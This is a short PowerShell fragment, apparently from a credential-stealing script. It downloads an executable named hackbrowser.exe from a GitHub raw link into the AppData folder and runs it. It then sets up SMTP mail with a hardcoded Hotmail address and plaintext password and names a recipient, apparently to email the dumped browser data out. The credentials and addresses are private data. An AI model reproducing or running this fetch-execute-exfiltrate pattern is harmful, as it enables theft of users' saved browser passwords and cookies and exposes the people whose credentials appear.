...
Invoke-WebRequest -Uri "https://github.com/deigisparkscripts233/shibainu43_jo/raw/main/hackbrowser.exe" -OutFile "$env:appdata\dump\hb.exe"
./hb.exe
...
$smtp.Credentials = New-Object System.Net.NetworkCredential("digisscrishiba@hotmail.com", "shibainu2020");
$smtp.EnableSsl = $true
$Message.From = "digisscrishiba@hotmail.com"
$Message.To.Add("eduardo.souza089@academico.ifs.edu.br")
